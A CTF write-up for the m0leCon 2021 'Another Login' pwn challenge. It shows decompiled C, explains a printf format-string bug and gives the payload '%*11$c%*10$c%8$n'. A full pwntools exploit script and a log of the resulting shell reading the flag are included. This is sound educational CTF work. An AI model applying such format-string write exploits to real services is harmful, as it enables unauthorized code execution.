# m0leCon 2021 CTF Teaser - Another Login

## Challenge

Just another simple login bypass challenge.

`nc challs.m0lecon.it 1907`

[chall](chall)

### Metadata

- Tags: `pwn`
- Author: *Alberto247*
- Points: 160
- Solves: 29

## Solution

The same writeup applies to the `Another Login` and the `Yet Another Login` challenges.

### Challenge artifacts

The challenges had the same challenge text:

```
Just another simple login bypass challenge.
nc challs.m0lecon.it 1907 (5556)
Author: Alberto247
```

Both provided a binary file for download.

### Binaries

Both binaries are x86-64 ELF LSB files, dynamically linked, not stripped, with all protections enabled.

#### file

```
ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f2a5a4624e88ff2238e013068baadf8b8b9bd570, for GNU/Linux 3.2.0, not stripped
```

#### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Challenge details

#### main()

The `main()` function was almost the same in both binaries.
It reads 4 bytes from `/dev/urandom` and seeds random with it.
Then calls the `signin()` function.
In Yet Another Login, the seed is zeroed out after initialization, so one cannot leak-it to produce the same random sequence.

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  FILE *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = fopen("/dev/urandom","r");
  if (local_18 == (FILE *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  fread(&local_1c,4,1,local_18);
  fclose(local_18);
  srand(local_1c);
  // local_1c = 0;
  signin();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

#### signin()

The `signin()` was the same for both challenges.
It greets the user and enters an infinite loop.
The loop variable starts from 0 and is increased by 1 at the end of every iteration.
If at the beginning of an iteration it is larger than 15 (0xf), the `win()` function is called.

The function keeps 2 variables on the stack (`rand1` and `rand1c`) that are randomized at every iteration and hold the same value.
At the end of an iteration these must hold the same value, otherwise the application exits.

There is another random variable on the stack (`rand2`). It is randomized at every iteration and holds a number between 2 and 9 (both included).

Next a 19 byte user input is read to a local variable on the stack. It is converted to a long number (`user_long`) and stored on the stack.
If it contains other characters than digits, this long variable (`user_long`) is zeroed out.

Next `printf(user_input)` is called, this is a format string vulnerability.

Lastly there are 3 checks we need to bypass at least once.

```c
void signin(void)

{
  int iVar1;
  size_t sVar2;
  size_t sVar3;
  uint uVar4;
  long in_FS_OFFSET;
  int i;
  long user_long;
  long *user_long_addr;
  long rand1;
  long rand1c;
  long rand2;
  char user_input [24];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  user_long_addr = &user_long;  // address of user_long
  puts(
      "Welcome to my super secure login! Ready to enter the password? We also have a nice anti-bot mechanism which asks you to sum each character!"
      );
  i = 0;
  while( true ) {
    // bypass checks 16 times to call win()
    // or overwrite i in the stack and bypass once
    if (0xf < i) {
      win(); //system("/bin/sh")
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    iVar1 = rand();
    uVar4 = (uint)(iVar1 >> 0x1f) >> 0x18;
    rand1 = (long)(int)((iVar1 + uVar4 & 0xff) - uVar4); // 1 random byte
    rand1c = rand1;
    iVar1 = rand();
    uVar4 = (uint)(iVar1 >> 0x1f) >> 0x1d;
    rand2 = (long)(int)(((iVar1 + uVar4 & 7) - uVar4) + 2);  // between 2-9
    printf("Give me the %d secret, summed to %ld!\n",(ulong)(i + 1U),rand2,
           (ulong)(i + 1U));
    // read 19 bytes from user
    fgets(user_input,0x13,stdin);
    iVar1 = atoi(user_input);
    user_long = (long)iVar1; // convert user input to long
    sVar2 = strspn(user_input,"0123456789"); // length of digit sequence starting from the beginning of the input
    sVar3 = strlen(user_input);
    if (sVar2 != sVar3) { // if the input contains anything else than numbers
      user_long = 0;
    }
    puts("Your input is: ");
    // format string vuln
    printf(user_input,0);
    if (user_long == 0) break;
    if (rand1c != rand1) {
      printf(
            "Looks like some memory corruption happened. Blame it on cosmic rays but I can\'t let you in."
            );
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    if (rand1 + rand2 != user_long) {
      puts("NOPE, GET OUT OF MY SERVER!");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    i = i + 1;
  }
  printf("??????");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

#### win()

```c
void win(void)

{
  system("/bin/sh");
  return;
}
```

### Solution

As all checked variables are on the stack, we can read them with e.g `%x` and write to them with `%n`.
If after triggering the vuln, `rand1 + rand2 == user_long && user_long != 0` holds, we bypass the checks.

Our aim is to read `rand1` and `rand2`, sum them and write the result to `user_long`.
The creator was kind enough to store the address of `user_long` in local variable `user_long_addr` on the stack.
So the last 'command' in our payload will be `%8$n` to overwrite `user_long`.

Before this, we need commands that print exactly `rand1 + rand2` characters (because `%n` writes this number).
There is a `*` format modifier in `printf` that allows the user to set the width a specific value is printed with another variable of `printf`.
So with the combination of `$` and `*` we can first print exactly `rand1` than `rand2` number of characters.

|width|description|
|---|---|
|(number)|Minimum number of characters to be printed. If the value to be printed is shorter than this number, the result is padded with blank spaces. The value is not truncated even if the result is larger.|
|*|The width is not specified in the format string, but as an additional integer value argument preceding the argument that has to be formatted.|

So the solution payload is the following:

```
%*11$c%*10$c%8$n
```

It tells `printf` to:
1. print your first argument as char padded to `rand2` long with spaces
2. print your second argument as char padded to `rand1` long with spaces
3. write the number of printed characters to the address held in your 8th variable.

```python
from pwn import *
from itertools import product
from string import ascii_letters
import hashlib

p = None

def genSHA(string_start, sha_end):
    for item in product(ascii_letters, repeat=6):
        solution = string_start+''.join(item).encode('ascii')
        test = hashlib.sha256(solution).hexdigest()
        if test.endswith(sha_end.decode('ascii')):
            return solution

def solvePoW():
    p.recvuntil("Give me a string starting with ")
    string_start = p.recvuntil(" ")[:-1]
    p.recvuntil("ends in ")
    sha_end = p.recvuntil(".")[:-1]

    print(f"[+] String start: {string_start}, SHA256 end: {sha_end}")
    sha_solution = genSHA(string_start, sha_end)
    print(sha_solution)

    p.sendline(sha_solution)

def run():
    global p
    p = remote("challs.m0lecon.it","1907")

    solvePoW()

    p.recvuntil("summed to ")
    sum = int(p.recvuntil("!")[:-1])
    for i in range(16):
        p.sendlineafter("\n", "%*11$c%*10$c%8$n")

    p.interactive()


if __name__ == "__main__":
    run()
```

If we execute it, we get the flag:

```
> python solve.py 
[+] Opening connection to challs.m0lecon.it on port 1907: Done
[+] String start: b'fMgSsgNKDd', SHA256 end: b'65639'
b'fMgSsgNKDdaaxdIh'
[*] Switching to interactive mode
Your input is: 
 \x00                                                                                                                                                                                                                             \xc0
Give me the 7 secret, summed to 6!
Your input is: 
     \x00                                                                                                    \xc0
$                                                                                                             Give me the 8 secret, summed to 6!
Your input is: 
     \x00                                                                                                                                                                                                                            \xc0
Give me the 9 secret, summed to 8!
Your input is: 
       \x00                                                                   \xc0
$                                                                              Give me the 10 secret, summed to 4!
Your input is: 
   \x00                                                                                                                                                                                                     \xc0
Give me the 11 secret, summed to 2!
Your input is: 
 \x00                                                                                                                                                                                \xc0
Give me the 12 secret, summed to 7!
Your input is: 
      \x00                 \xc0
Give me the 13 secret, summed to 7!
Your input is: 
      \x00                                                                                                      \xc0
Give me the 14 secret, summed to 3!
Your input is: 
      \x00                                                                                                      \xc0
Give me the 14 secret, summed to 3!
Your input is: 
Your input is: 
      \x00                                                                                                      \xc0
Give me the 14 secret, summed to 3!
Your input is: 
  \x00                                                                                                   \xc0
Give me the 15 secret, summed to 2!
Your input is: 
 \x00                                                                                              \xc0
Give me the 16 secret, summed to 3!
Your input is: 
  \x00                                                                                \xc0
$                                                                                        ls
PoW.py    entrypoint.sh  flag.txt  login
$ cat flag.txt
ptm{D1d_u_r3ad_th3_0per4t0r_m4nua1_b3f0re_l0gging_1n?}
```

The flag is `ptm{D1d_u_r3ad_th3_0per4t0r_m4nua1_b3f0re_l0gging_1n?}`.